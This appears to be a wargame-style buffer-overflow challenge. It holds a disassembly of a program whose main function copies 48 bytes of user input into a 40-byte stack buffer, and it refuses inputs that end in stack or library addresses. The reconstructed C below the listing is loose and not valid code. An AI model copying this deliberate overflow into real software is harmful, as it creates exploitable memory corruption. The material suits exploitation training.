   0x8048440  <main>:       push   %ebp   0x8048441  <main+1>:     mov    %ebp,%esp     0x8048443  <main+3>:     sub    %esp,40     0x8048446  <main+6>:     cmp    DWORD PTR  [%ebp+8],1   0x804844a  <main+10>:    jg     0x8048463  <main+35>     0x804844c  <main+12>:    push   0x8048540   0x8048451  <main+17>:    call   0x8048354  <printf>   0x8048456  <main+22>:    add    %esp,4   0x8048459  <main+25>:    push   0   0x804845b  <main+27>:    call   0x8048364  <exit>   0x8048460  <main+32>:    add    %esp,4     0x8048463  <main+35>:    mov    %eax,DWORD PTR  [%ebp+12]   0x8048466  <main+38>:    add    %eax,4   0x8048469  <main+41>:    mov    %edx,DWORD PTR  [%eax]   0x804846b  <main+43>:    add    %edx,47   0x804846e  <main+46>:    cmp    BYTE PTR  [%edx],0xbf   0x8048471  <main+49>:    jne    0x8048490  <main+80>   0x8048473 <main+51>:     push   0x804854c   0x8048478  <main+56>:    call   0x8048354  <printf>   0x804847d <main+61>:     add    %esp,4     0x8048480  <main+64>:    push   0   0x8048482  <main+66>:    call   0x8048364  <exit>   0x8048487  <main+71>:    add    %esp,4     0x804848a  <main+74>:    lea    %esi,[%esi]   0x8048490  <main+80>:    mov    %eax,DWORD PTR  [%ebp+12]   0x8048493 <main+83>:     add    %eax,4   0x8048496  <main+86>:    mov    %edx,DWORD PTR  [%eax]   0x8048498 <main+88>:     add    %edx,47   0x804849b  <main+91>:    cmp    BYTE PTR  [%edx],0x40   0x804849e <main+94>:     jne    0x80484b7 <main+119>     0x80484a0  <main+96>:    push   0x8048561   0x80484a5  <main+101>:   call   0x8048354 <printf>   0x80484aa  <main+106>:   add    %esp,4     0x80484ad <main+109>:    push   0   0x80484af  <main+111>:   call   0x8048364 <exit>   0x80484b4 <main+116>:    add    %esp,4     0x80484b7  <main+119>:   push   48   0x80484b9  <main+121>:   mov    %eax,DWORD PTR  [%ebp+12]   0x80484bc  <main+124>:   add    %eax,4   0x80484bf  <main+127>:   mov    %edx,DWORD PTR  [%eax]   0x80484c1  <main+129>:   push   %edx   0x80484c2  <main+130>:   lea    %eax,[%ebp-40]   0x80484c5  <main+133>:   push   %eax   0x80484c6  <main+134>:   call   0x8048374  <strncpy>   0x80484cb  <main+139>:   add    %esp,12     0x80484ce  <main+142>:   lea    %eax,[%ebp-40]   0x80484d1 <main+145>:    push   %eax     0x80484d2  <main+146>:   push   0x804857e   0x80484d7 <main+151>:    call   0x8048354 <printf>   0x80484dc  <main+156>:   add    %esp,8   0x80484df <main+159>:    leave   0x80484e0  <main+160>:   ret	if(argc<=1){   printf("argv  error\n");   exit(0);   }                   if(argv1=="0xbf"){   printf("stack retbayed  you!\n");   exit(0);   }                     argv1=="0x40"{   printf("library retbayed you,  too!!\n");   exit(0);   }                                   strncpy(buffer,argv[1],48);               printf("%s\n",buffer);
                                           	                                        
